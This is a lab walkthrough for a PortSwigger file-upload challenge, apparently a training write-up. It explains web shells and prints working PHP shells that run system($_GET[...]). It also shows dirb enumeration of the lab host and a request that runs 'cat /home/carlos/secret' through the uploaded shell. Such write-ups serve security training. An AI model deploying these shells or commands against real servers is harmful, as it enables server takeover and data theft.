## Welcome, my friend. Today we will start the [1. File Upload lab](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload) in ```portswigger```

# Explain this Scenario:

# Exploiting unrestricted file uploads to deploy a web shell

## 1. What is the worst security scenario?
#### When a website allows you to upload files that contain server code, such as ```PHP```, ```Java```, or ```Python``` files, and the site is set up to execute this code as software, it poses a significant risk.

## 2. What is a web interface?
#### A Web Shell is a malicious script that allows an attacker to execute arbitrary commands on a remote web server just by sending HTTP requests to the appropriate point.

## 3. What could an attacker do if they could load the web interface?
#### If you can load the web interface successfully, it means you have full control of the server. You could:

##### 1. Read and write random files.
##### 2. Extracting sensitive data.
##### 3. Using the server to carry out attacks against the internal network infrastructure or other servers outside the network.

## 4. Example of a simple web interface using PHP:
#### If you are using a PHP web interface, you can use a script like this to read files from the server's file system:

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

or 

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

<?php
    echo system($_GET["cmd"]);
?>

### When you upload this script to the server, you can send a request to this malicious file, and the server will respond with the contents of the target file.




# Let's play this lab:

#### Let's log in to your own account using the following credentials: ```wiener:peter```


![image](https://github.com/user-attachments/assets/1d856fbf-32ac-465c-bbe6-3d9c9f882250)


#### Let's create a php malicious payload in file ```tor1.php```:

### within tor1.php:

```
<?php
    echo system($_GET["tor"]);
?>
```

![image](https://github.com/user-attachments/assets/295203de-7776-489e-b02f-df7db4e826ee)


### Now, Let's upload this malicious payload to server.

![image](https://github.com/user-attachments/assets/03b2432e-bf45-4ce5-8288-8dee4cbee46e)

#### WOW! The file has been uploaded successfully.

### That server is very nice because it also tells us where our beautiful file is. We just have to go to that path ```/avatars/tor1.php```.

#### But This path was not complete, but there was a path before it


#### To find out the full path, we can use tools such as ```derb``` to discover hidden directory, or we can use ```burp Suite``` and wander around the site and explore paths that are hidden or unknown to us.

#### Using dirb tool:

```
dirb https://0a43006f03b23e5d84a947a8009b0083.web-security-academy.net
```

### Great we discover ```/files```  How about we explore more of that path?

```
dirb https://0a43006f03b23e5d84a947a8009b0083.web-security-academy.net/files
```

![image](https://github.com/user-attachments/assets/bf135c5f-c88b-4f7f-8cf3-0be3bd931016)

## Well, our file is uploaded in this path ```/files/avatars/tor1.php```

#### Using burp suite tool:

![image](https://github.com/user-attachments/assets/454a051f-c063-49e4-bcff-ee4f669c0399)

### Well, You can use the methods that you find easy for you.


#### Ok , Let's go to this path ```files/avatars/tor1.php```. But it ```won't work```, we'll know why now.

![image](https://github.com/user-attachments/assets/aa881ec4-8d8f-48aa-897b-cb6d98dcbade)

#### The reason is that we forgot to include the ```tor``` parameter.

```
/files/avatars/tor1.php?tor=id
```

![image](https://github.com/user-attachments/assets/035e4ba4-610d-47a7-8028-fdf2fceedb5b)

#### Ok this task requrie reach to /home/carlos/secret file.

![image](https://github.com/user-attachments/assets/877440f3-b7cb-42c5-a6a6-077435f9bb74)


```
/files/avatars/tor1.php?tor=cat /home/carlos/secret
```

![image](https://github.com/user-attachments/assets/2f1a44d6-5fa0-4266-b588-8dc3c54393e4)

#### alert: this secret is douple, copy single secret only.
### Let's Submit this secret using the button provided in the lab banner.

## Then ...
